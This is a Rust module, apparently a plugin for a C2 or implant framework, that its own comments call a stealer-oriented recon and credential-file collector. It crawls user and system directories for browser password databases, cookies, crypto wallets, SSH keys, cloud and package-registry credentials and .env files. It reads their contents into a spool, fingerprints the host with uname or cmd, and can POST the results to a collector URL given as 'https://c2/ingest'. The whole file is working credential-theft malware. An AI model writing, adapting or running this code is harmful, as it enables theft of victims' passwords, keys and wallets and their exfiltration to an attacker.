//! Recon and credential-file collector (ABI 2).
//!
//! Walks the roots supplied in the task arguments (or per-OS defaults), matches
//! filenames against a stealer-oriented pattern list, spools matching files into
//! the state SQLite spool, and optionally POSTs the manifest to a collector.
//!
//! Arguments (all optional):
//!
//! ```json
//! {"roots": ["/home"], "max_depth": 4, "max_bytes": 524288,
//!  "patterns": ["login data"], "post_url": "https://c2/ingest"}
//! ```
#![cfg_attr(not(target_arch = "wasm32"), forbid(unsafe_code))]
#![deny(missing_docs)]

use modsdk::{mod_main, CapError, Ctx};
use serde_json::{json, Value};

/// Files worth taking by default. Case-insensitive substrings.
const DEFAULT_PATTERNS: &[&str] = &[
    "login data",
    "web data",
    "cookies",
    "logins.json",
    "key4.db",
    "key3.db",
    "signons.sqlite",
    "wallet.dat",
    ".wallet",
    "wallet.json",
    "keychain",
    "id_rsa",
    "id_ed25519",
    ".pem",
    ".ppk",
    ".kdbx",
    ".env",
    "credentials",
    "secrets",
    "config.json",
    "appsettings.json",
    "settings.py",
    ".aws",
    ".npmrc",
    ".pypirc",
    ".docker/config.json",
    ".git-credentials",
    "local state",
    "leveldb",
];

/// Directories that are noise for this purpose.
const SKIP_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "cache",
    "code cache",
    "gpucache",
    "cachestorage",
    "service worker",
    "crashpad",
    "shadercache",
    "blob_storage",
];

const MAX_FINDINGS: usize = 400;
const HARD_ENTRIES: usize = 20_000;

fn strings(ctx: &Ctx, key: &str) -> Vec<String> {
    ctx.args()
        .get(key)
        .and_then(Value::as_array)
        .map(|values| {
            values
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default()
}

fn number(ctx: &Ctx, key: &str, fallback: u64, cap: u64) -> u64 {
    ctx.args()
        .get(key)
        .and_then(Value::as_u64)
        .unwrap_or(fallback)
        .min(cap)
}

fn defaults(platform: &str) -> Vec<String> {
    if platform == "windows" {
        vec!["C:/Users".into(), "C:/ProgramData".into()]
    } else {
        vec![
            "/home".into(),
            "/root".into(),
            "/etc".into(),
            "/var/lib".into(),
            "/tmp".into(),
        ]
    }
}

fn platform(ctx: &Ctx) -> String {
    if let Ok(Some(os)) = ctx.env_get("OS") {
        if os.to_ascii_lowercase().contains("windows") {
            return "windows".into();
        }
    }
    "unix".into()
}

fn host_summary(ctx: &Ctx) -> String {
    let attempts: [(&str, &[&str]); 2] = [("uname", &["-a"]), ("cmd", &["/c", "ver"])];
    for (command, args) in attempts {
        let args: Vec<String> = args.iter().map(|value| (*value).to_owned()).collect();
        if let Ok(bytes) = ctx.exec(command, &args) {
            let text = String::from_utf8_lossy(&bytes);
            let line = text.lines().next().unwrap_or_default().trim().to_owned();
            if !line.is_empty() {
                return line.chars().take(200).collect();
            }
        }
    }
    String::new()
}

fn kind_for(name: &str) -> &'static str {
    let name = name.to_ascii_lowercase();
    if name == "login data" || name == "logins.json" || name == "key4.db" || name == "key3.db" {
        "browser_password"
    } else if name == "web data" {
        "browser_autofill"
    } else if name == "cookies" {
        "browser_cookie"
    } else if name.contains("wallet") || name.ends_with(".kdbx") {
        "wallet"
    } else if name.contains("id_rsa") || name.contains("id_ed25519") || name.ends_with(".pem") {
        "ssh_key"
    } else if name.contains(".env") || name.contains("credential") || name.contains("secret") {
        "secret"
    } else if name.contains("config") || name.contains("settings") {
        "config"
    } else {
        "other"
    }
}

fn matches(name: &str, patterns: &[String]) -> Option<&'static str> {
    let lower = name.to_ascii_lowercase();
    if patterns.iter().any(|pattern| lower.contains(pattern)) {
        Some(kind_for(&lower))
    } else {
        None
    }
}

#[mod_main]
fn run(ctx: &Ctx) -> Result<(), CapError> {
    let platform = platform(ctx);
    let roots = {
        let supplied = strings(ctx, "roots");
        if supplied.is_empty() {
            defaults(&platform)
        } else {
            supplied
        }
    };
    let depth_cap = number(ctx, "max_depth", 4, 12) as usize;
    let byte_cap = number(ctx, "max_bytes", 512 * 1024, 1024 * 1024) as usize;
    let patterns = {
        let supplied = strings(ctx, "patterns");
        if supplied.is_empty() {
            DEFAULT_PATTERNS
                .iter()
                .map(|value| (*value).to_owned())
                .collect()
        } else {
            supplied
        }
    };

    let mut queue: Vec<(String, usize)> = roots.iter().map(|root| (root.clone(), 0)).collect();
    let mut findings: Vec<Value> = Vec::new();
    let mut scanned = 0_usize;
    let mut stored = 0_usize;
    let mut errors = 0_usize;

    while let Some((path, depth)) = queue.pop() {
        if scanned >= HARD_ENTRIES || findings.len() >= MAX_FINDINGS {
            break;
        }
        let listing = match ctx.read_dir(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                errors += 1;
                continue;
            }
        };
        let Ok(Value::Array(entries)) = serde_json::from_slice::<Value>(&listing) else {
            errors += 1;
            continue;
        };
        for entry in entries {
            scanned += 1;
            let name = entry.get("name").and_then(Value::as_str).unwrap_or_default();
            let kind = entry.get("kind").and_then(Value::as_str).unwrap_or_default();
            let size = entry.get("size").and_then(Value::as_u64).unwrap_or(0);
            if name.is_empty() {
                continue;
            }
            let full = if path.ends_with('/') || path.ends_with('\\') {
                format!("{path}{name}")
            } else {
                format!("{path}/{name}")
            };
            if kind == "dir" {
                if depth < depth_cap
                    && !SKIP_DIRS
                        .iter()
                        .any(|skip| name.to_ascii_lowercase() == *skip)
                {
                    queue.push((full, depth + 1));
                }
                continue;
            }
            if kind != "file" {
                continue;
            }
            let Some(kind) = matches(name, &patterns) else {
                continue;
            };
            let take = size.min(byte_cap as u64) as usize;
            let severity = match kind {
                "wallet" | "ssh_key" | "secret" | "browser_password" => 2,
                "browser_autofill" | "browser_cookie" | "config" => 1,
                _ => 0,
            };
            let mut record = json!({
                "kind": "inventory",
                "dedupe_key": format!("recon:{full}"),
                "severity": severity,
                "data": {"path": full, "size": size, "artifact": kind},
            });
            match ctx.read_file_range(&full, 0, take.max(1)) {
                Ok(bytes) => match ctx.spool_put(&full, kind, &bytes) {
                    Ok(id) => {
                        stored += 1;
                        record["data"]["spool_id"] = json!(id);
                        record["data"]["bytes"] = json!(bytes.len());
                    }
                    Err(error) => {
                        record["data"]["error"] = json!(format!("spool: {error}"));
                    }
                },
                Err(error) => {
                    record["data"]["error"] = json!(format!("read: {error}"));
                }
            }
            findings.push(record);
            if findings.len() >= MAX_FINDINGS {
                break;
            }
        }
    }

    let report = json!({
        "ok": true,
        "platform": platform,
        "host": host_summary(ctx),
        "roots": roots,
        "scanned": scanned,
        "stored": stored,
        "errors": errors,
        "findings": findings,
    });
    let mut text = serde_json::to_string(&report).unwrap_or_else(|_| "{}".into());

    if let Some(url) = ctx.args().get("post_url").and_then(Value::as_str) {
        match ctx.http_post(url, text.as_bytes()) {
            Ok(bytes) => {
                let status = String::from_utf8_lossy(&bytes);
                text = format!("{text}\n{{\"post\":\"{}\"}}", status.chars().take(200).collect::<String>());
            }
            Err(error) => {
                text = format!("{text}\n{{\"post_error\":\"{error}\"}}");
            }
        }
    }
    // The host truncates at 64 KiB; keep the wire frame useful by cutting here.
    if text.len() > 60_000 {
        let mut end = 60_000;
        while !text.is_char_boundary(end) {
            end -= 1;
        }
        text.truncate(end);
    }
    ctx.emit_stdout(&text);
    Ok(())
}
